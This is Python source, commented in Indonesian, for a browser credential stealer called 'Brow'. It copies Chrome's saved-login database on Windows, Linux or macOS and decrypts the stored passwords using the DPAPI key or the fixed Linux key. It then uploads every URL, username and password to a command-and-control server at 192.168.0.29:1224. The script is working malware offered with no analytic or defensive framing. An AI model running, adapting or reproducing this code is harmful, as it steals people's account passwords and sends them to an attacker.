import os
import sys
import platform
import subprocess
import time
import importlib

# Konfigurasi C2
C2_HOST = "http://192.168.0.29:1224"
C2_UPLOAD_URL = f"{C2_HOST}/brow_upload"

# Direktori default Chrome
CHROME_PATHS = {
    "windows": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default"),
    "linux": os.path.expanduser("~/.config/google-chrome/Default"),
    "macos": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")
}

# Fungsi untuk menginstal library yang hilang
def install_library(library_name, pip_name=None):
    try:
        __import__(library_name)
        print(f"[+] {library_name} sudah terinstal")
        return True
    except ImportError:
        pip_name = pip_name or library_name
        print(f"[*] {library_name} tidak ditemukan, mencoba menginstal...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
            print(f"[+] Berhasil menginstal {pip_name}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Gagal menginstal {pip_name}: {e}")
            return False

# Fungsi untuk memastikan semua dependensi terinstal
def ensure_dependencies():
    required_libraries = [
        ("requests", "requests"),
        ("pycryptodome", "pycryptodome"),
        ("sqlite3", "sqlite3")
    ]
    if platform.system().lower() == "windows":
        required_libraries.append(("win32crypt", "pywin32"))

    all_installed = True
    for lib_name, pip_name in required_libraries:
        if not install_library(lib_name, pip_name):
            all_installed = False

    if all_installed:
        try:
            # Impor library setelah instalasi
            global sqlite3, base64, json, shutil, AES, win32crypt, requests, datetime, timezone
            import sqlite3
            import base64
            import json
            import shutil
            # Impor ulang Crypto untuk memastikan modul tersedia
            importlib.import_module("Crypto")
            from Crypto.Cipher import AES
            import requests
            from datetime import datetime, timezone
            if platform.system().lower() == "windows":
                import win32crypt
            print("[+] Semua dependensi berhasil diimpor")
            return True
        except ImportError as e:
            print(f"[-] Gagal mengimpor dependensi: {e}")
            return False
    else:
        print("[-] Beberapa dependensi gagal diinstal, kode tidak dapat berjalan")
        return False

# Fungsi untuk mendapatkan kunci dekripsi di Windows
def get_encryption_key_windows():
    local_state_path = os.path.join(os.path.dirname(CHROME_PATHS["windows"]), "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Hapus prefiks "DPAPI"
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"[-] Error mendapatkan kunci Windows: {e}")
        return None

# Fungsi untuk mendapatkan kunci dekripsi di Linux/macOS
def get_encryption_key_unix():
    return b"peanuts"  # Ganti dengan logika keyring jika diperlukan

# Fungsi untuk mendekripsi kata sandi
def decrypt_password(password, key):
    try:
        if platform.system() == "Windows":
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(password)[:-16].decode()
            return decrypted
        else:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(password)[:-16].decode()
            return decrypted
    except Exception as e:
        print(f"[-] Error mendekripsi kata sandi: {e}")
        return ""

# Fungsi untuk mencuri kredensial dari Chrome
def steal_chrome_credentials():
    os_type = platform.system().lower()
    chrome_path = CHROME_PATHS.get(os_type, "")
    if not os.path.exists(chrome_path):
        print(f"[-] Direktori Chrome tidak ditemukan: {chrome_path}")
        return []

    login_db = os.path.join(chrome_path, "Login Data")
    temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), "Login Data")
    shutil.copyfile(login_db, temp_db)

    credentials = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        key = get_encryption_key_windows() if os_type == "windows" else get_encryption_key_unix()
        if not key:
            return credentials

        for row in cursor.fetchall():
            url, username, encrypted_password, date_created, date_last_used = row
            if not url or not username or not encrypted_password:
                continue

            password = decrypt_password(encrypted_password, key)
            if password:
                created_time = datetime.fromtimestamp(date_created / 1000000 - 11644473600, tz=timezone.utc).isoformat()
                last_used = datetime.fromtimestamp(date_last_used / 1000000 - 11644473600, tz=timezone.utc).isoformat()

                credential = (
                    f"origin_url: {url}, "
                    f"username: {username}, "
                    f"password: {password}, "
                    f"time_created: {created_time}, "
                    f"time_last_used: {last_used}"
                )
                credentials.append(credential)

        conn.close()
        os.remove(temp_db)
    except Exception as e:
        print(f"[-] Error mencuri kredensial: {e}")

    return credentials

# Fungsi untuk mengunggah kredensial ke C2
def upload_to_c2(credentials):
    try:
        data = "\n".join(credentials)
        response = requests.post(C2_UPLOAD_URL, data=data.encode('utf-8'), timeout=10)
        if response.status_code == 200:
            print("[+] Kredensial berhasil diunggah ke C2")
        else:
            print(f"[-] Gagal mengunggah kredensial: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah ke C2: {e}")

# Fungsi utama Brow
def brow():
    print("[*] Brow dimulai...")
    credentials = steal_chrome_credentials()

    if credentials:
        print(f"[+] Ditemukan {len(credentials)} kredensial")
        for cred in credentials:
            print(f"[*] {cred}")
        upload_to_c2(credentials)
    else:
        print("[-] Tidak ada kredensial yang ditemukan")

if __name__ == "__main__":
    if ensure_dependencies():
        brow()
    else:
        print("[-] Gagal menjalankan Brow karena dependensi tidak lengkap")